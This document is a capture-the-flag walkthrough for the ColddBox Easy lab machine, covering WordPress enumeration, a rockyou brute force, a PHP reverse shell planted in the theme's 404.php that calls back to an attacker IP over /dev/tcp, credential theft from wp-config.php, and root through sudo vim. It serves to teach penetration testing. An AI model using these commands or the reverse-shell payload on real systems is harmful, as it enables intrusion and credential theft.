# ColddBox Easy Writeup

## Target Information

- Machine: ColddBox Easy
- Goal:
  - Obtain `user.txt`
  - Obtain `root.txt`

---

# Step 1: Nmap Scan

Started with an aggressive Nmap scan:

```bash
sudo nmap -sC -sV -Pn -A 10.48.180.215
```

## Results

- Port 80 open
- Apache 2.4.18
- WordPress 4.1.31

Important findings:

```text
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
_http-generator: WordPress 4.1.31
_http-title: ColddBox | One more machine
```

This indicated a vulnerable and outdated WordPress installation.

---

# Step 2: WordPress Enumeration

Used WPScan to enumerate users:

```bash
sudo wpscan --url http://10.48.180.215 --enumerate u
```

## Users Found

```text
c0ldd
hugo
philip
```

Additional findings:

- XML-RPC enabled
- WordPress readme exposed
- Outdated WordPress version

---

# Step 3: Brute Force WordPress Credentials

Used WPScan password attack against discovered users:

```bash
wpscan --url http://10.48.180.215 \
-U c0ldd,hugo,philip \
-P /usr/share/wordlists/rockyou.txt
```

## Successful Credentials

```text
c0ldd : 9876543210
```

---

# Step 4: Login to WordPress

Visited:

```text
http://10.48.180.215/wp-login.php
```

Logged in using:

```text
Username: c0ldd
Password: 9876543210
```

---

# Step 5: Obtain Reverse Shell

## Start Netcat Listener

On attacker machine:

```bash
nc -lvnp 4444
```

---

## Edit Theme File

Inside WordPress dashboard:

```text
Appearance → Editor → 404.php
```

Replaced contents with:

```php
<?php

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.248.179/4444 0>&1'");

?>
```

Replace `192.168.248.179` with attacker IP.

---

## Trigger Reverse Shell

Visited:

```text
http://10.48.180.215/wp-content/themes/twentyfifteen/404.php
```

Received shell:

```text
www-data@ColddBox-Easy
```

---

# Step 6: Stabilize Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

# Step 7: Find User Flag

Search for user flag:

```bash
find / -name user.txt 2>/dev/null
```

Result:

```text
/home/c0ldd/user.txt
```

Tried reading directly:

```bash
cat /home/c0ldd/user.txt
```

Permission denied.

---

# Step 8: Find Credentials in wp-config.php

Read WordPress configuration:

```bash
cat /var/www/html/wp-config.php | grep -E "DB_USER|DB_PASSWORD|DB_NAME"
```

Output:

```text
define('DB_NAME', 'colddbox');
define('DB_USER', 'c0ldd');
define('DB_PASSWORD', 'cybersecurity');
```

---

# Step 9: Switch User

Used discovered credentials:

```bash
su c0ldd
```

Password:

```text
cybersecurity
```

Successfully switched to `c0ldd`.

---

# Step 10: Read user.txt

```bash
cat /home/c0ldd/user.txt
```

Output:

```text
RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
```

This is the user flag.

---

# Step 11: Privilege Escalation Enumeration

Checked sudo permissions:

```bash
sudo -l
```

Password:

```text
cybersecurity
```

Output:

```text
(root) /usr/bin/vim
(root) /bin/chmod
(root) /usr/bin/ftp
```

`vim` can be abused for root shell.

---

# Step 12: Gain Root Shell

Executed:

```bash
sudo vim -c ':!/bin/bash'
```

Root shell obtained:

```text
root@ColddBox-Easy
```

---

# Step 13: Read root.txt

```bash
cat /root/root.txt
```

Output:

```text
wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
```

This is the root flag.

---

# Final Flags

## user.txt

```text
RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
```

## root.txt

```text
wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
```

---

# Attack Path Summary

1. Enumerated WordPress users
2. Brute forced credentials
3. Logged into WordPress admin panel
4. Uploaded PHP reverse shell through theme editor
5. Obtained `www-data` shell
6. Extracted credentials from `wp-config.php`
7. Switched to `c0ldd`
8. Abused sudo `vim` permissions for root access
9. Retrieved both flags

---
